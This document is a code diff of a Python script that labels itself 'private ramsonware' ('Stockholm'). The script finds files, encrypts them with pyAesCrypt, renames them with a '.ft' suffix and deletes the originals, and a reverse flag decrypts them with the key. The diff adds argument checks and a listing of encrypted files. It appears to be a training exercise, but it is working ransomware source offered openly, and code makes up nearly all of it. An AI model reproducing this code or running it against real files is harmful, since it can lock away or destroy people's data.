@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import os
+import sys
 import argparse
 import markdown
 import webbrowser
@@ -47,6 +48,12 @@ def get_files_ft():
         for f in file[2]:
             if f.endswith(".ft"):
                 files_ft.append(file[0] + "/" + f)
+    # for fi in files_ft:
+    #     try:
+    #         with exiftool.ExifToolHelper() as et:
+    #             metadata = et.get_metadata(file)
+    #     except:
+    #         files_ft.remove(fi)
     return (files_ft)
 
 def encryptFiles(silent, key):
@@ -59,61 +66,73 @@ def encryptFiles(silent, key):
                 if (silent == False):
                     print("\n\t***** WARNING TO AVOID IRREVERSIBLE CHANGES OR LOST OF DATA *****\nThe file:\t\t", file,  "\nMust be renamed as:\t", file + "_stockholm.ft",
                         "\nThat is to avoid that another file will be erased during encryption.\n\n")
-                pyAesCrypt.encryptFile(file, file + "_stockholm" + ".ft", key)
+            pyAesCrypt.encryptFile(file, file + "_stockholm" + ".ft", key)
+            os.remove(file)
         except:
             pyAesCrypt.encryptFile(file, file + ".ft", key)
-        os.remove(file)
+            os.remove(file)
     
 
 def decryptFiles(silent, key):
     files = get_files_ft()
+    if (silent == False):
+        print("ENCRYPTED FILE LIST")
+        for fi in files:
+            print(fi)
+        print()
     for file in files:
         if (silent == False):
             print("Trying to decrypt file:", file, "and rename it as:", (file.rstrip("ft")).rstrip('.'))
         try:
             if file.endswith("_stockholm.ft"):
                 pyAesCrypt.decryptFile(file, (file.replace("_stockholm.ft", "")), key)
+                os.remove(file)
             else:
-                pyAesCrypt.decryptFile(file, (file.replace(".ft", "")), key)
-            os.remove(file)
+                if not os.path.exists(file.replace(".ft", "")):
+                    pyAesCrypt.decryptFile(file, (file.replace(".ft", "")), key)
+                    os.remove(file)
+                else:
+                    continue
         except:
             continue
 
 if __name__ == '__main__':
-    parser = argparse.ArgumentParser(description='My own private ramsonware.', add_help=False)
-    parser.add_argument('key', type=str, action='store', nargs='?')
-    parser.add_argument('-r', '--reverse', action='store_true')
-    parser.add_argument('-s', '--silent', action='store_true')
-    parser.add_argument('-v', '--version', action='store_true')
-    parser.add_argument('-h', '--help', action='store_true')
-    args = parser.parse_args()
-    if (args.help == True):
-        with open('README.md', 'r+') as helper:
-            markdown_string = helper.read()
-            html_string =markdown.markdown(markdown_string)
-        try:
-            webbrowser.get()
-            with open('README.html', 'w+') as h:
-                h.write(html_string)
-            this_directory = Path(__file__).parent
-            webbrowser.open_new("file://"+str(this_directory)+"/"+"README.html")
-            input("press a key to continue.....")
-            os.remove(str(this_directory)+"/"+'README.html') 
-        except:
-            print(markdown_string)
-        exit
-    elif (args.version == True):
-        print("Stockholm ramsonware version 1.0.0")
-        exit
-    elif (args.reverse == False and len(args.key) >= 16):
-        encryptFiles(args.silent, args.key)
-        exit
-    elif (args.reverse == True and len(args.key) >= 16):
-        decryptFiles(args.silent, args.key)
-        exit
-    elif (len(args.key) < 16):
-        print("Your key must have at least 16 characters")
-        exit
+    if len(sys.argv) > 1:
+        parser = argparse.ArgumentParser(description='My own private ramsonware.', add_help=False)
+        parser.add_argument('key', type=str, action='store', nargs='?')
+        parser.add_argument('-r', '--reverse', action='store_true')
+        parser.add_argument('-s', '--silent', action='store_true')
+        parser.add_argument('-v', '--version', action='store_true')
+        parser.add_argument('-h', '--help', action='store_true')
+        args = parser.parse_args()
+        if (args.help == True):
+            with open('README.md', 'r+') as helper:
+                markdown_string = helper.read()
+                html_string =markdown.markdown(markdown_string)
+            try:
+                webbrowser.get()
+                with open('README.html', 'w+') as h:
+                    h.write(html_string)
+                this_directory = Path(__file__).parent
+                webbrowser.open_new("file://"+str(this_directory)+"/"+"README.html")
+                input("press a key to continue.....")
+                os.remove(str(this_directory)+"/"+'README.html') 
+            except:
+                print(markdown_string)
+        elif (args.version == True):
+            print("Stockholm ramsonware version 1.0.0")
+        elif (args.reverse == False and len(args.key) >= 16):
+            encryptFiles(args.silent, args.key)
+            exit
+        elif (args.reverse == True and len(args.key) >= 16):
+            decryptFiles(args.silent, args.key)
+            exit
+        elif (len(args.key) < 16):
+            print("Your key must have at least 16 characters")
+            exit
+        else:
+            print("ERROR: Invalid argument please use flag -h to get some help.")
+            exit
     else:
-        print("Not allowed flag, please use flag -h to get some help.")
+        print("ERROR: Invalid argument please use flag '-h' to get some help.")
         exit
